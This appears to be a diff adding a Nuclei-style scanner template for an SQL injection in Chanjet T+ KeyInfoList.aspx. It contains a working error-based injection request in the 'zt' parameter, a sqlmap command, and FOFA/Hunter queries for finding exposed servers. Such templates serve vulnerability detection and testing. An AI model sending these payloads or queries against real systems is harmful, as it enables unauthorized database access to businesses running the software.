@@ -1,0 +1,29 @@
+id: changjet-tplus-KeyInfoList-sqli
+info:
+  name: 畅捷通 TPlus KeyInfoList.aspx - SQL 注入漏洞
+  author: leadlife
+  severity: high
+  description: todo
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%95%85%E6%8D%B7%E9%80%9ATPlus-KeyInfoList.aspx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    hunter-query: app.name="畅捷通 T+"
+    fofa-query: icon_hash="-2067519629" || app="畅捷通-TPlus"
+    sqlmap: sqlmap -u "http://example.com:1245//tplus/UFAQD/KeyInfoList.aspx?preload=1&zt=1" -p 'zt'
+  tags: changjet,sqli,tplus
+
+http:
+  - raw:
+      - |
+        GET /tplus/UFAQD/KeyInfoList.aspx?preload=1&zt=1%27)%20AND%20@@version%20%3E%200%20--%20XFtA%27 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nvarchar'
+          - '转换成数据类型 int 时失败'
+        condition: and
